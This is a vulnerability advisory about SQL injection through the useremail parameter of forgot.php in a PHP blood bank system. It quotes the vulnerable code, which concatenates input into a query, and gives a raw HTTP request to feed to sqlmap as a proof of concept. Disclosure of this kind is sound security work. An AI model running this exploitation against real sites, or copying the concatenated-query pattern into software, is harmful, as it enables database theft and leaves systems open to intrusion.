# blood-bank-system-in-php forgot.php via sql injection

[Blood Bank System In PHP With Source Code - Source Code & Projects (code-projects.org)](https://code-projects.org/blood-bank-system-in-php-with-source-code/)

## NAME OF AFFECTED PRODUCT(S)

**blood-bank-system-in-php**

## Vendor Homepage

https://code-projects.org/blood-bank-system-in-php-with-source-code/

##  **Manufacturers sites**

https://code-projects.org/

## AFFECTED  VERSION(S)

### Vulnerable File

forgot.php

### VERSION(S)

-  v1.0

### Software Link

https://download.code-projects.org/details/09f1f26e-072d-4fec-bd3b-974076ee162c

## PROBLEM TYPE

network remote.

## Vulnerability Type

remote sql injection

## Root Cause

In forgot.php , SQL injection is used to obtain database information.

## Impact

## **Description of the vulnerability**

### forgot.php

In the source code，the    useremail parameter is not filtered and concatenated into the SQL statement.        

```
if(isset($_POST['sub']))
      {

        $useremail=$_POST['useremail'];
        $q=$db-> prepare("SELECT * from login where useremail='$useremail'");
        $q->execute();
        }
```

​                                                                                                                                                                                                                                                                                                                                                                                                                                                       

![mmexport1727539131244](https://github.com/user-attachments/assets/3e0df60a-195a-4e17-b698-3345386ac14c)



## **Vulnerability recurrence**

### **POC**

```
POST /forgot.php/ HTTP/1.1
Host: bloodbankmgmtsystem
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 46
Origin: http://bloodbankmgmtsystem
Connection: close
Referer: http://bloodbankmgmtsystem/forgot.php/
Cookie: PHPSESSID=0260m5gv7b100hhs03pjumevku
Upgrade-Insecure-Requests: 1
Priority: u=0, i

tab=on&useremail=123%40aa.com&sub=Submit+Email
```

save as 1.txt

excute the command.

```
python sqlmap.py -r "E:\1.txt" 
```

![mmexport1727539128867](https://github.com/user-attachments/assets/b52c14b7-867f-4e52-95d1-69bdfbd2cca5)

